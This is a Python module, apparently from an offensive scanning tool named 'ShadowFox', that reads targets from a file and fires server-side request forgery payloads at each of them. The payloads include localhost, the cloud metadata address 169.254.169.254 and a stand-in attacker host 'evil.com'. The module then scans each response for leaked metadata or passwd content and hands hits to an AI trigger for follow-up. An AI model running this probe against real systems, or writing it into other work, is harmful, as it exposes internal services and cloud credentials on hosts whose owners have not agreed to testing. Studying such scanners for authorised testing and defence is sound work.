import requests
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from log_to_text import log_to_text
from tools.auto_add_severity import classify_severity
from logics.fuzz_ai_trigger import ai_trigger_if_needed

def test_ssrf(url):
    ssrf_payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254",  # AWS Metadata
        "http://0.0.0.0",
        "http://internal.local",
        "http://evil.com"  # DNS log opcija kad postoji listener
    ]

    headers = {
        "User-Agent": "ShadowFox-SSRF"
    }

    for payload in ssrf_payloads:
        if "FUZZ" in url:
            test_url = url.replace("FUZZ", payload)
        else:
            test_url = f"{url}?url={payload}"

        try:
            r = requests.get(test_url, headers=headers, timeout=10)
            if any(keyword in r.text.lower() for keyword in ["ec2", "internal", "root:x", "localhost", "meta-data"]):
                log_to_text(f"[SSRF] {test_url} -> {payload}")
                severity = classify_severity(r.text)
                ai_trigger_if_needed("SSRF", test_url, payload, r.text, severity)
                print(f"[+] SSRF Detektovan: {test_url}")
                return {"url": test_url, "payload": payload, "severity": severity}
        
        except Exception as e:
            print(f"[-] Greška kod {test_url}: {e}")

    print("[-] Nema SSRF odaziva.")
    return None

if __name__ == "__main__":
    with open("targets/targets.txt", "r") as f:
        targets = f.read().splitlines()
    
    for url in targets:
        test_ssrf(url)
